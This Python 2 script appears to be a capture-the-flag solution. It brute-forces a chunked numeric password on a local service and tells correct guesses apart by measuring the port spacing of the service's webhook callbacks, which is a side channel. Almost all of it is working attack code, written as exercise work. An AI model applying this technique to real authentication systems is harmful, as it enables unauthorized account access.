import requests
import json
import random
import socket
import threading
import Queue

WEBHOOK_HOST = 'localhost'
PASSWORDDB_ADDR_PORT = 'http://localhost:9091'
EXPECTED_PORT_OFFSET = 2

sock_q = Queue.Queue()
port_q = Queue.Queue()
final_q = Queue.Queue()
log_q = Queue.Queue()

def zero_pad_string(strnum):
    while len(strnum) < 3:
        strnum = "0%s" % strnum
    return strnum

class CTFMachine:
    
    def __init__(self):
        self.sessions = [requests.session(), requests.session(), requests.session()]
        self.old_previous_port = 0
        self.previous_port = 0
        self.recovered_port = 0
        self.chunks = ['000', '000', '000', '000']

    def get_password(self, override_index=None, override_chunk=None):
        chunks = self.chunks
        if override_index is not None:
            chunks[override_index] = override_chunk
        return "".join(map(str, chunks))

    def send_request(self, password, tnum):
        #start listener
        webhook_sock = sock_q.get(True)
        t = threading.Thread(target=self.webhook_get_port, args=(webhook_sock, tnum))
        t.start()
        payload = {"password": password, "webhooks": ["%s:%s" % (WEBHOOK_HOST, webhook_sock.getsockname()[1])]}
        r = self.sessions[tnum - 1].post(PASSWORDDB_ADDR_PORT, json.dumps(payload))
        if r.status_code == 200:
            #while t.is_alive():
                #print "joining"
                #t.join(1)
                #print log_q.get(False).getsockname()
            #print self.recovered_port
            if json.loads(r.text)['success']:
                final_q.put('HOLY FUCK YES WINRAR')

    def webhook_get_port(self, sock, tnum):
        #log_q.put(sock)
        sock.listen(5)
        client, address = sock.accept()
        client.close()
        data = {'order': tnum, 'port': address[1]}
        port_q.put(data)
        exit()

    def brute_chunk(self, chunk_index):
        chunk_val = 0 #int(self.chunks[chunk_index])
        while chunk_val <= 999:
            success = False
            password = self.get_password(chunk_index, zero_pad_string(str(chunk_val)))

            print password

            #find 3 bind-able ports and put them on the socket queue
            for sockcount in range(1,4):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                breakout = False
                while not breakout:
                    try:
                        webhook_port = random.randrange(1025, 65534)
                        s.bind((WEBHOOK_HOST, webhook_port))
                        #print "bound to %s" % webhook_port
                        breakout = True
                    except Exception, e:
                        #print e
                        print "webhook bind to %s failed. retrying." % webhook_port
                sock_q.put(s)
                s = None

            t1 = threading.Thread(target=self.send_request, args=(password, 1))
            t2 = threading.Thread(target=self.send_request, args=(password, 2))
            t3 = threading.Thread(target=self.send_request, args=(password, 3))
            t1.start()
            t2.start()
            t3.start()

            while t1.is_alive() or t2.is_alive() or t3.is_alive():
                """nothin"""

            if not final_q.empty():
                valid_chunk = zero_pad_string(str(chunk_val))
                self.chunks[chunk_index] = valid_chunk
                print "holy shit we win! flag is %s" % self.get_password()
                exit()

            ports = []
            ports.append(port_q.get(True))
            ports.append(port_q.get(True))
            ports.append(port_q.get(True))

            testport = [None, None, None]

            for data in ports:
                testport[data['order'] - 1] = data['port']

            print testport

            diff1 = (testport[1] - testport[0]) - EXPECTED_PORT_OFFSET
            diff2 = (testport[2] - testport[1]) - EXPECTED_PORT_OFFSET
            jitter = diff2 - diff1
            print "jitter=%s" % jitter
            if (diff1 == (chunk_index + 1)) and (diff2 == (chunk_index + 1)):
                break

            chunk_val = chunk_val + 1
        valid_chunk = zero_pad_string(str(chunk_val))
        self.chunks[chunk_index] = valid_chunk
        return valid_chunk


lol = CTFMachine()
for x in range(0, 4):
    prev = ''
    comp = False
    while not comp:
        c = lol.brute_chunk(x)
        if c == prev:
            comp = True
            print "chunk %s verified." % x
        else:
            prev = c
            print "verification failed for chunk %s. retrying." % x


print "success:true was never encountered, this is at least partially incorrect:"
print lol.get_password()

